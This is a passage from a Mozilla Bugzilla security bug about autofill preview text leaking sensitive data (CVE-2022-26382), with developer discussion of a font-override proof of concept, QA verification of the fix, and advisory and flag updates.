Flags: sec-bounty? → sec-bounty+

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=1741888#c41)• 3 years ago |
|  | |

Tim, I noticed that the PoC for one of the many follow-up Chromium bugs (<https://bugs.chromium.org/p/chromium/issues/detail?id=1013882>) just overwrites the system-ui font with a `@font-face` declaration in CSS. Would this work against our solution too? If not, why?

Flags: needinfo?(tgiles)

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=1741888#c42)• 3 years ago |
|  | |

No, system-ui can't be rewritten, it's a generic font family.

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=1741888#c43)• 3 years ago |
|  | |

(In reply to Frederik Braun [:freddy] from [comment #41](/show_bug.cgi?id=1741888#c41 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> Tim, I noticed that the PoC for one of the many follow-up Chromium bugs (<https://bugs.chromium.org/p/chromium/issues/detail?id=1013882>) just overwrites the system-ui font with a `@font-face` declaration in CSS. Would this work against our solution too? If not, why?

I'm going to defer to Emilio here. I tried to set up the PoC page attached to the linked chromium bug and was unable to see the alert mentioned (or even see the cc autocomplete menu like in Chrome), so I suppose our current solution mitigates the linked PoC attack.

Flags: needinfo?(tgiles)

|  | [Matthew Finkel [:sysrqb]](/user_profile?user_id=609548) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a6501903_609548)• 3 years ago |

Flags: needinfo?(sysrqb)

|  | [Mihai Boldan, Desktop QA [:mboldan]](/user_profile?user_id=551058) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a7144755_551058)• 3 years ago |

Flags: qe-verify+

|  | [Mihai Boldan, Desktop QA [:mboldan]](/user_profile?user_id=551058) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a7321490_551058)• 3 years ago |

QA Whiteboard: [post-critsmash-triage]

|  | [Alin Ilea, Desktop Test Engineering](/user_profile?user_id=636163) |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=1741888#c44)• 3 years ago |
|  | |

Verified - Fixed in Nightly 98.0a1 (build id: 20220201093942) and latest Nightly 99.0a1 (build id: 20220213214259), using Windows 10, macOS 11 and Ubuntu 20. We also verified the issue using different locales (US,CA,FR) using the poc and poc-width files attached.

Status: RESOLVED → VERIFIED
[status-firefox98](/buglist.cgi?f1=cf_status_firefox98&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox98&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox98&o1=equals&v1=verified)Flags: qe-verify+

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a8988066_578488)• 3 years ago |

Whiteboard: [reporter-external] [client-bounty-form] [verif?] → [reporter-external] [client-bounty-form] [verif?][adv-main98+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=1741888#c45)• 3 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9266119)
— [Details](attachment.cgi?id=9266119&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a9077810_578488)• 3 years ago |

Alias: CVE-2022-26382

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a24415777_1689)• 2 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a79843068_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1741888&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Young Min Kim](/user_profile?user_id=694094)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review


